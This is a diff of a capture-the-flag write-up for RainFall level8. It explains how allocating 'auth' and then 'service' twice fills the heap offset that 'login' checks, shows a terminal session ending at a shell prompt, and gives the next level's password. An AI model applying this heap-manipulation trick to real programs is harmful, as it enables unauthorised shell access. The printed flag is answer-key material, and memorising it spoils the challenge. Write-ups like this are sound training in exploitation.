@@ -1,17 +1,27 @@
-level8@RainFall:~$ ./level8
-(nil), (nil)
-auth
-(nil), (nil)
-auth
-0x804a008, (nil)
-login
-Password:
-0x804a008, (nil)
-service
-0x804a008, 0x804a018
-login
-Password:
-0x804a008, 0x804a018
-service
-0x804a008, 0x804a028
-login
+# What do we exploit?
+
+Stupidity.
+
+# How do we exploit it?
+
+Again, after some analysis we can get a sense of what's happening here. Basically, we have two global variables: `auth` and `service`. Given binary supports 4 main commands:
+
+- `auth `, which allocates memory in the `auth` variable;
+- `service`, which allocates memory in the `service` variable;
+- `reset`, which frees `auth` variable;
+- `login`, which gives us access to the shell, if `auth[32]` is not NULL.
+
+Pointers will be placed consequently on the heap with 16 bytes padding between them. So, to accomplish the challenge of making `auth[32]` not NULL, we should perform allocation in the auth, then allocate service twice, and pass the login method, which will give us the access to the shell.
+
+    level8@RainFall:~$ ./level8
+    (nil), (nil)
+    auth
+    0x804a008, (nil)
+    service
+    0x804a008, 0x804a018
+    service
+    0x804a008, 0x804a028
+    login
+    $
+
+Now, using command line, we can get the password from the next level: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`.
